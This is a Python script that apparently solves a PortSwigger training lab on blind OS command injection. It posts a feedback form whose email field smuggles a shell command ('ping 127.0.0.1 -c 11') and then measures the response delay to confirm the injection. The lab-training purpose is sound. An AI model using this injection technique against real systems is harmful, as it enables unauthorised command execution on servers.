#!/usr/bin/env python3
# Lab: Blind OS command injection with time delays
# Lab-Link: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
from datetime import timedelta
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(client, url):
    r = client.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find('input', attrs={'name': 'csrf'})['value']


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    print(f'[ ] Causing a 10 seconds delay')

    url = f'{host}/feedback'
    csrf = get_csrf_token(client, url)
    data = {'csrf': csrf,
            'name': 'someName',
            'email': 'invalid@xample.com;ping 127.0.0.1 -c 11;#',
            'subject': 'someSubject',
            'message': 'someMessage'}
    r = client.post(f'{url}/submit', data=data)
    if r.elapsed > timedelta(seconds=10):
        print(f'[+] Response looks like it was delayed')
    else:
        print(f'[-] Response does not look like it was delayed')

    print(f'[ ] Attempting to validate that lab is solved')
    r = requests.get(host)
    if 'Congratulations, you solved the lab!' in r.text:
        print(f'[+] Lab solved')
    else:
        print(f'[-] Failed to solve lab')


if __name__ == "__main__":
    main()